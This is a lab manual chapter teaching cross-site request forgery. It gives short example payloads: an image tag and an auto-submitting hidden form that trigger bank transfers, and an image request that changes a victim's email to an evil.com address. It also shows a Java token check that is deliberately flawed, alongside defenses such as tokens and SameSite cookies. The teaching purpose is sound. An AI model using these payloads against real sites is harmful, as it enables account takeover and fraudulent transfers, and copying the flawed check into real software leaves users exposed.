# 🎭 Lab Manual: CSRF Cross-Site Request Forgery

### 0. Preface
If XSS makes the browser execute malicious code, CSRF is even sneakier—it makes the browser do bad things using YOUR identity, without you knowing.

*   **CSRF (Cross-Site Request Forgery)**: An attack that tricks the browser into sending malicious requests using the user's authenticated session.
*   **Core Concept**: You think you're browsing memes, but you're actually wiring money to hackers.

This chapter's goal: **Understand why "click a link and lose your account" is actually real.**

---

### 1. How CSRF Works

**The Attack Trinity**:
1. User is logged into the target website (browser has valid cookies)
2. User visits attacker's malicious page
3. Malicious page sends requests to the target site

**Core Principle**:
```
Browser's Same-Origin Policy: I won't let you READ others' responses
CSRF Vulnerability: But I'll let you SEND requests... with cookies attached
```

**Fun Fact**:
Browsers automatically attach cookies for the corresponding domain. This convenience feature became CSRF's best friend.

---

### 2. GET-based CSRF: The Image Trap

**The Concept**:
Exploits the fact that GET requests can be triggered via `<img>` tags.

**Attack Example**:
```html
<!-- Looks like just an image -->
<img src="http://bank.com/transfer?to=hacker&amount=10000" />

<!-- When user visits a page with this code, browser auto-sends the request -->
<!-- If user happens to be logged into bank.com, transfer completes -->
```

**The Irony**:
User thinks they're looking at cat pictures, actually funding a hacker.

---

### 3. POST-based CSRF: The Hidden Form

**The Concept**:
While POST requests can't be triggered via images, they can be done through auto-submitting forms.

**Attack Example**:
```html
<form id="evil-form" action="http://bank.com/transfer" method="POST">
    <input type="hidden" name="to" value="hacker" />
    <input type="hidden" name="amount" value="10000" />
</form>
<script>document.getElementById('evil-form').submit();</script>
```

**Advanced Version**: Use iframe to hide the submission process—user notices nothing.

---

### 4. Invalid CSRF Token

**Common Misconception**: Adding a CSRF Token makes everything secure? Not necessarily.

**Vulnerability Scenario**:
```java
// Server only checks if Token exists, not who it belongs to
if (validTokens.containsKey(csrf_token)) {
    // Validation passed -- but this Token might belong to another user!
    processRequest();
}
```

**Attack Method**:
```html
<!-- Attacker logs in with their own account, gets their own CSRF Token -->
<!-- Then uses their Token in a malicious page to impersonate the victim -->
<img src="http://target.com/change-email?email=hacker@evil.com&csrf_token=ATTACKER_OWN_TOKEN" />
```

**Key Point**:
Token validates "existence" but ignores "ownership". Someone else's access card opens your door too.

---

### 5. Defense Measures Explained

**CSRF Token**:
```html
<!-- Server generates random token, embeds in form -->
<input type="hidden" name="csrf_token" value="a7x9k2m...">
```
Attackers can't obtain this token because Same-Origin Policy prevents them from reading target page content.

**SameSite Cookie**:
```http
Set-Cookie: session=abc123; SameSite=Strict
```
- `Strict`: Completely blocks cross-site sending
- `Lax`: Allows top-level navigation GET requests
- `None`: Allows cross-site (requires Secure flag)

**Double Verification**:
Critical operations require password or captcha—even if CSRF succeeds, attack can't complete.

---

### 6. Conclusion

What makes CSRF terrifying is its stealth—the user did nothing except open a webpage, yet their account got manipulated.

Remember: **Never trust requests from the browser, even if they carry valid cookies.**

---

**[Ready? Go experience what it feels like to be "phished"]**
